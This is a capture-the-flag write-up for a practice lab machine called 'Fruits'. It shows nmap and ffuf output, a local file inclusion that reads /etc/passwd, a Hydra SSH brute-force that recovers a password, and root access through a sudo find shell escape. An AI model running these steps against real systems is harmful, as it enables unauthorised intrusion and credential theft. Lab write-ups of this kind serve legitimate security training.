# Fruits [https://labs.thehackerslabs.com/machine/38]

# Description

    Numbering of directories
    Local File Inclusion (LFI)
    Gross force SSH
    Abuse of privileges in sudoers

# Nmap Scan Result

```
$ sudo nmap -sCV -p- 192.168.173.128

Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-15 02:59 GMT
Nmap scan report for 192.168.173.128
Host is up (0.00050s latency).
Not shown: 65533 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 ae:dd:1a:b6:db:a7:c7:8c:f3:03:b8:05:da:e0:51:68 (ECDSA)
|_  256 68:16:a7:3a:63:0c:8b:f6:ba:a1:ff:c0:34:e8:bf:80 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: P\xC3\xA1gina de Frutas
|_http-server-header: Apache/2.4.57 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.84 seconds
```

# Rabbit Hole [NO LFI HERE]

	http://192.168.173.128/buscar.php?busqueda=apple

# Dir Bruteforcing

```
$ ffuf -w /usr/share/wordlists/rockyou.txt -u http://192.168.173.128/FUZZ.php -fw 598

fruits                  [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 3ms]
```

```
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://192.168.173.128/fruits.php?FUZZ=/etc/passwd -fw 1

file                    [Status: 200, Size: 1128, Words: 6, Lines: 25, Duration: 3ms]
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
mysql:x:102:110:MySQL Server,,,:/nonexistent:/bin/false
bananaman:x:1001:1001::/home/bananaman:/bin/bash
```

# SSH Brute [username - bananaman]

```
$ hydra -l bananaman -P /usr/share/wordlists/rockyou.txt ssh://192.168.173.128

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-15 03:48:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.173.128:22/
[STATUS] 186.00 tries/min, 186 tries in 00:01h, 14344218 to do in 1285:20h, 11 active

[22][ssh] host: 192.168.173.128   login: bananaman   password: celtic

1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-15 03:50:17
```

# User Flag

```
bananaman@Fruits:~$ ls
user.txt
bananaman@Fruits:~$ cat user.txt
482c811da5d5b4bc6d497ffa98491e38
bananaman@Fruits:~$ pwd
/home/bananaman
bananaman@Fruits:~$ 
```

# Priv Esca

```
bananaman@Fruits:~$ sudo -l
Matching Defaults entries for bananaman on Fruits:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User bananaman may run the following commands on Fruits:
    (ALL) NOPASSWD: /usr/bin/find
bananaman@Fruits:~$ 
```

# GTFOBins [https://int0x33.github.io/gtfobins/find/]

```
It runs in privileged context and may be used to access the file system, escalate or maintain access with elevated privileges if enabled on sudo.

    sudo find . -exec /bin/sh \; -quit

```

# Root Flag

```
bananaman@Fruits:~$ sudo /usr/bin/find . -exec /bin/sh \; -quit
# cd /root
# ls
root.txt
# cat root.txt
21232f297a57a5a743894a0e4a801fc3
```

